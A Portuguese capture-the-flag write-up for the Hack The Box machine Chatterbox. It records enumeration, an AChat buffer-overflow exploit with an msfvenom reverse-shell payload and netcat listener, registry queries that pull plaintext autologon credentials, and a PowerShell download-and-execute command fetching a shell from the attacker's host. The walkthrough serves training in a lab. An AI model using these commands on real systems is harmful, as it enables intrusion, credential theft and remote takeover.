Chatterbox
========================

# Enumeratioin


    sudo nmap_enum chatterbox.htb | tee nmap_output.txt
    
RPC null session (um vetor de ataque)
    
    rpcclient -U '' -N 10.10.10.74

![qownnotes-media-XaDbQi](../../../media/qownnotes-media-XaDbQi.png)

    
    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn chatterbox.htb
        
Portas UDPs nem ajudaram com nada:

    rpcinfo -s 10.10.10.74

Nada

![qownnotes-media-WzkmME](../../../media/qownnotes-media-WzkmME.png)

    smbclient -L //10.10.10.74
    
    smbclient -L //10.10.10.74 -U ''
    
    smbclient -L //10.10.10.74 -U '' -N

Nada de ajudar

http://chatterbox.htb:9255
http://10.10.10.74:9255

Esse foi o cara que ajudou:

    nmap -p- -T5 -n -Pn 10.10.10.74

![qownnotes-media-VnVaHB](../../../media/qownnotes-media-VnVaHB.png)

![qownnotes-media-nNxkKl](../../../media/qownnotes-media-nNxkKl.png)

Fomos pesquisar a respeito e vejam só:

<https://github.com/mpgn/AChat-Reverse-TCP-Exploit/tree/master>

# Exploitation

Dando uma lida no exploit desse cara, deu pra chegar a seguinte conclusão:

    msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp RHOST=10.10.10.74 LHOST=10.10.14.4 LPORT=8080 exitfunc=thread -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

Peguei o exploit que estava lá e coloquei o conteúdo gerado pelo último comando dentro do exploit que ficou assim:

    wget https://github.com/mpgn/AChat-Reverse-TCP-Exploit/raw/master/AChat_Exploit.py -o exploi.py
    
    vi exploit.py

Alterar o IP da vítima
![qownnotes-media-jMFwQN](../../../media/qownnotes-media-jMFwQN.png)

    nc -nlvp 8080
    python2 exploit.py

qui foi sem novidade!

![qownnotes-media-laxBKF](../../../media/qownnotes-media-laxBKF.png)

# Privilege Escalation

Aqui vale ressaltar que pegamos uma crredencial em texto clarto no registro do windows com o seguinte comando:
  
Eu fiz uma tentativa com:

     whoami /priv
![qownnotes-media-ltnyVm](../../../media/qownnotes-media-ltnyVm.png)

Parti para um outro vetor:

    systeminfo > si.txt

Sem sucesso, porrque tinha muito KB instalado:


    reg query HKCU /f password /t REG_SZ /s

![qownnotes-media-zRFLCQ](../../../media/qownnotes-media-zRFLCQ.png)

Vale resslatar que com os comandos abaixo também seria possívell obter esse resultado:

    PS C:\Windows\system32> (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName                                                                                                                         
Alfred
    
    PS C:\Windows\system32> (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword                                                                                                                         
Welcome1!

Depois disso basta testar essa credencial para o admin da máquina com os seguintes comandos:

    $password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
    Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4:8000/shell.ps1')" -Credential $cred

![qownnotes-media-faunIn](../../../media/qownnotes-media-faunIn.png)

![qownnotes-media-PqWFdx](../../../media/qownnotes-media-PqWFdx.png)

![qownnotes-media-eVQMMf](../../../media/qownnotes-media-eVQMMf.png)
